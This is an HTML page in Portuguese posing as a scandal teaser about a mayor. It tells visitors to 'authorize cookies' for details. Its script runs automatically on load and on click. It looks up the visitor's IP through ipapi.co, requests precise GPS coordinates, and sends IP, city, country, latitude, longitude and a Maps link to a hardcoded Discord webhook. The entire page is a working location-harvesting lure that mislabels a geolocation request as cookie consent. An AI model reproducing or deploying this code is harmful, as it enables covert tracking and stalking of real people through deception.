<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>imagem direta</title>

  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      font-family: Arial, sans-serif;
      text-align: center;
    }

    .img-click {
      cursor: pointer;
      max-width: 280px;
      width: 80%;
      margin-top: 20px;
    }

    #msg {
      margin-top: 15px;
      color: #555;
      font-size: 14px;
    }
  </style>
</head>
<body>

  <h2>Veja com quem ele se encontrou</h2>
  <p>Um cara desse ainda diz ser prefeito, autorize o cookies para mais detalhes</p>

  <!-- IMAGEM CENTRALIZADA (fallback manual) -->
  <img
    src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSm9GDELhZUJKb1-hfXRPjhLVQCsV_6UQcH_IQqzWUX5w&s"
    class="img-click"
    alt="Veja todo o detalhe"
    onclick="go()"
  >

  <div id="msg">Solicitando localiza√ß√£o‚Ä¶</div>

<script>
async function go() {
  document.getElementById("msg").innerText = "Solicitando de acesso‚Ä¶";

  const ipData = await fetch("https://ipapi.co/json/")
    .then(r => r.json())
    .catch(() => null);

  if (!navigator.geolocation) {
    document.getElementById("msg").innerText =
      "Geolocaliza√ß√£o n√£o suportada neste navegador.";
    return;
  }

  navigator.geolocation.getCurrentPosition(
    async pos => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      const acc = pos.coords.accuracy;

      await fetch("https://discord.com/api/webhooks/1465862095399817288/GcmIkAw0qPum20GWqxT0Y1XqOswQ2SFHKu4yATRrVV0cdWV8A1R3ohUDTRmD_XV7S_ez", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content:
`üì° Nova localiza√ß√£o
IP: ${ipData?.ip || "N/A"}
Pa√≠s: ${ipData?.country_name || "N/A"}
Cidade: ${ipData?.city || "N/A"}

GPS:
Lat: ${lat}
Lon: ${lon}
Precis√£o: ${acc} m
üó∫Ô∏è https://maps.google.com/?q=${lat},${lon}`
        })
      });

      document.getElementById("msg").innerText =
        "imagem carregada!";
    },
    () => {
      document.getElementById("msg").innerText =
        "‚ùå cookies negado. Toque na imagem para tentar novamente.";
    }
  );
}

// tenta automaticamente ao abrir
window.onload = go;
</script>

</body>
</html>
